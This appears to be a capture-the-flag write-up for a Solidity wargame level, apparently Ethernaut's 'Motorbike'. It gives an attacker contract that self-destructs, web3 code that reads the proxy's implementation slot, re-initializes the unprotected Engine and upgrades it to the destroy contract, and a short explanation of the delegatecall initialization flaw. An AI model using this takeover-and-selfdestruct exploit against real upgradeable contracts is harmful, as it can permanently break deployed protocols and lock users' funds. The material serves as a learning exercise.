```javascript
pragma solidity ^0.6.0;

contract MotorBikeAttack {
    function destroy() public {
        selfdestruct(tx.origin);
    }
}

```

Deploy the above contract to get `destroy_address`.

```javascript
engine_addresss_with_padding = await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc") // that's the proxy location defined in the standard.

engine_address = engine_addresss_with_padding.slice(26, 66); // The last 20 bytes (it is left zero padded)

let self_destruct_contract_address = destroy_address

await sendTransaction({
	from: player, 
	to: engine_address, 
	data: web3.eth.abi.encodeFunctionCall({
	    name: 'initialize',
	    type: 'function',
	    inputs: []
	}, [])
});

await sendTransaction({
	from: player, 
	to: engine_address, 
	data: web3.eth.abi.encodeFunctionCall({
	    name: 'upgradeToAndCall',
	    type: 'function',
	    inputs: [{
	        type: 'address',
	        name: 'newImplementation'
	    },{
	        type: 'bytes',
	        name: 'data'
	    }]
	}, 
	[
		self_destruct_contract_address, 
	   	web3.eth.abi.encodeFunctionCall({
    		name: 'destroy',
		    type: 'function',
		    inputs: []
		}, [])
	])
});
```

This works because `initialize` was called using delegatecall, so it was actually using the proxy's storage, which means the Engine is not properly initialized. So, we can exploit it by initializing it again and setting our address as the upgrader, then just upgrade the underlying implementation. 

